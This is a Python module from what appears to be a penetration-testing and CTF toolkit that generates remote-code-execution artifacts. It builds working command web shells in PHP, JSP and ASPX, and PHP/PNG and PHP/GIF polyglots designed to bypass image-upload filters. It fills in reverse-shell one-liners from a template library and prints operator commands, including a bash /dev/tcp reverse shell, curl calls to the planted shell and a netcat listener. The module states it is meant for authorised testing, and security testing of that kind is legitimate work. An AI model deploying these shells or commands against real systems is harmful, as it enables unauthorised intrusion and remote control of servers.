"""RCE artifact generation: reverse shells, web shells, and image polyglots.

This module *generates files and one-liners* for authorised testing and CTFs.
POAD never executes them, never opens a listener, and never contacts a target.
The connect-back goes to the LHOST/LPORT you supply and catch yourself.

Nothing here is a reverse-shell *framework*: no C2, no beacons, no persistence,
no auto-delivery, nothing destructive. The web shells are deliberately readable
(not obfuscated); the goal is CTF filter-bypass, not detection evasion.
"""

from __future__ import annotations

import struct
import zlib
from dataclasses import dataclass

from poad.core import template_engine
from poad.core.validation import ValidationError, validate_nonempty

AUTHORISED_NOTE = "POAD web shell - use only on systems you are authorised to test."

WEBSHELL_LANGS = ("php", "jsp", "aspx")
POLYGLOT_IMAGES = ("png", "gif")


# ---------------------------------------------------------------------------
# Reverse shells (data-driven, from the builtin 'rce' template pack)
# ---------------------------------------------------------------------------

@dataclass
class ReverseShell:
    name: str
    shell: str      # bash | nc | python | php | ...
    platform: str
    payload: str
    note: str | None = None


def _validate_endpoint(lhost: str, lport: str) -> tuple[str, str]:
    lhost = validate_nonempty(str(lhost), field="LHOST")
    lport = str(lport).strip()
    if not lport.isdigit() or not (0 < int(lport) < 65536):
        raise ValidationError("LPORT must be a port number 1-65535")
    if any(c in lhost for c in (" ", "/", "\\")):
        raise ValidationError("LHOST must be a bare host or IP")
    return lhost, lport


def reverse_shells(
    lhost: str,
    lport: str,
    os_name: str = "linux",
    *,
    shells: list[str] | None = None,
    library=None,
) -> list[ReverseShell]:
    """Return reverse-shell one-liners for the given LHOST/LPORT and OS."""
    lhost, lport = _validate_endpoint(lhost, lport)
    if os_name not in ("linux", "windows"):
        raise ValidationError("os must be 'linux' or 'windows'")
    if library is None:
        library = template_engine.load_builtin_library()

    out: list[ReverseShell] = []
    for tpl in library.by_category("rce"):
        if tpl.platform != os_name:
            continue
        shell_tag = tpl.tags[1] if len(tpl.tags) > 1 else ""
        if shells and shell_tag not in shells:
            continue
        payload = template_engine.substitute(tpl.template, {"LHOST": lhost, "LPORT": lport})
        out.append(ReverseShell(tpl.name, shell_tag, tpl.platform, payload, tpl.notes))
    return out


def available_shells(os_name: str, library=None) -> list[str]:
    if library is None:
        library = template_engine.load_builtin_library()
    seen: list[str] = []
    for tpl in library.by_category("rce"):
        if tpl.platform == os_name and len(tpl.tags) > 1 and tpl.tags[1] not in seen:
            seen.append(tpl.tags[1])
    return seen


# ---------------------------------------------------------------------------
# Web shells
# ---------------------------------------------------------------------------

def _php_webshell(param: str) -> str:
    return (
        "<?php\n"
        f"// {AUTHORISED_NOTE}\n"
        f"if (isset($_REQUEST['{param}'])) {{\n"
        f"    system($_REQUEST['{param}']);\n"
        "}\n"
        "?>\n"
    )


def _jsp_webshell(param: str) -> str:
    return (
        '<%@ page import="java.io.*" %>\n'
        "<%\n"
        f"    // {AUTHORISED_NOTE}\n"
        f'    String cmd = request.getParameter("{param}");\n'
        "    if (cmd != null) {\n"
        "        Process p = Runtime.getRuntime().exec(cmd);\n"
        "        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
        "        String line;\n"
        '        while ((line = r.readLine()) != null) { out.println(line); }\n'
        "    }\n"
        "%>\n"
    )


def _aspx_webshell(param: str) -> str:
    return (
        '<%@ Page Language="C#" %>\n'
        '<%@ Import Namespace="System.Diagnostics" %>\n'
        '<%@ Import Namespace="System.IO" %>\n'
        '<script runat="server">\n'
        "void Page_Load(object sender, EventArgs e) {\n"
        f"    // {AUTHORISED_NOTE}\n"
        f'    string cmd = Request["{param}"];\n'
        "    if (cmd != null) {\n"
        "        Process p = new Process();\n"
        '        p.StartInfo.FileName = "cmd.exe";\n'
        '        p.StartInfo.Arguments = "/c " + cmd;\n'
        "        p.StartInfo.UseShellExecute = false;\n"
        "        p.StartInfo.RedirectStandardOutput = true;\n"
        "        p.Start();\n"
        "        Response.Write(p.StandardOutput.ReadToEnd());\n"
        "    }\n"
        "}\n"
        "</script>\n"
    )


_WEBSHELL_BUILDERS = {"php": _php_webshell, "jsp": _jsp_webshell, "aspx": _aspx_webshell}
_WEBSHELL_EXT = {"php": "php", "jsp": "jsp", "aspx": "aspx"}


def webshell(lang: str, *, param: str = "cmd") -> tuple[str, str]:
    """Return (suggested_filename, text_content) for a command web shell."""
    lang = lang.lower()
    if lang not in _WEBSHELL_BUILDERS:
        raise ValidationError(f"lang must be one of: {', '.join(WEBSHELL_LANGS)}")
    if not param.isidentifier():
        raise ValidationError("param must be a simple identifier (e.g. 'cmd')")
    return f"shell.{_WEBSHELL_EXT[lang]}", _WEBSHELL_BUILDERS[lang](param)


# ---------------------------------------------------------------------------
# PHP-in-image polyglots (upload-filter bypass)
# ---------------------------------------------------------------------------

def _min_png() -> bytes:
    """A valid 1x1 transparent PNG (passes getimagesize())."""
    sig = b"\x89PNG\r\n\x1a\n"

    def chunk(typ: bytes, data: bytes) -> bytes:
        body = typ + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)  # 1x1, 8-bit RGBA
    idat = zlib.compress(b"\x00\x00\x00\x00\x00")         # 1 scanline: filter + RGBA(0,0,0,0)
    return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def polyglot(image: str, *, param: str = "cmd") -> tuple[str, bytes]:
    """Return (suggested_filename, byte_content) for a PHP/image polyglot.

    The file is a valid image (so ``getimagesize()``-style checks pass) that also
    contains PHP. It only executes if the server ends up treating it as PHP
    (e.g. a permissive double extension, or an LFI that includes the upload).
    """
    image = image.lower()
    if image not in POLYGLOT_IMAGES:
        raise ValidationError(f"image must be one of: {', '.join(POLYGLOT_IMAGES)}")
    if not param.isidentifier():
        raise ValidationError("param must be a simple identifier (e.g. 'cmd')")

    php = f"<?php system($_GET['{param}']); ?>".encode("ascii")
    if image == "gif":
        # GIF89a magic is enough for getimagesize to report image/gif.
        content = b"GIF89a;\n" + php + b"\n"
        return "shell.php.gif", content
    # PNG: append PHP after a valid PNG. Image parsers stop at IEND; PHP runs it all.
    content = _min_png() + b"\n" + php + b"\n"
    return "shell.php.png", content


# ---------------------------------------------------------------------------
# Access / catch instructions (printed after generation)
# ---------------------------------------------------------------------------

def listener_commands(lport: str) -> list[str]:
    return [
        f"nc -lvnp {lport}              # start the catcher BEFORE triggering the shell",
        "# On Pwnbox/HTB, set LHOST to your VPN IP:  ip -4 addr show tun0",
        "# Upgrade to a PTY once connected:",
        "#   python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then  Ctrl-Z; stty raw -echo; fg",
    ]


def webshell_commands(url_hint: str, param: str = "cmd") -> list[str]:
    base = url_hint.rstrip("/")
    return [
        f"curl '{base}/shell.php?{param}=id'           # confirm execution",
        f"curl '{base}/shell.php' --data-urlencode '{param}=id'   # if POST",
        "# Pivot to a reverse shell (start 'nc -lvnp 4444' first, set LHOST):",
        f"curl '{base}/shell.php?{param}=' --data-urlencode "
        "'cmd=bash -c \"bash -i >& /dev/tcp/LHOST/4444 0>&1\"'",
    ]


def polyglot_commands(image: str, param: str = "cmd") -> list[str]:
    return [
        "# 1) Upload the file where the app expects an image.",
        "# 2) It runs only if the server executes it as PHP. Common triggers:",
        "#    - permissive double extension (shell.php.%s served as PHP)" % image,
        "#    - LFI that includes the uploaded path:  ?page=/path/to/upload",
        f"curl 'http://TARGET/uploads/shell.php.{image}?{param}=id'",
    ]
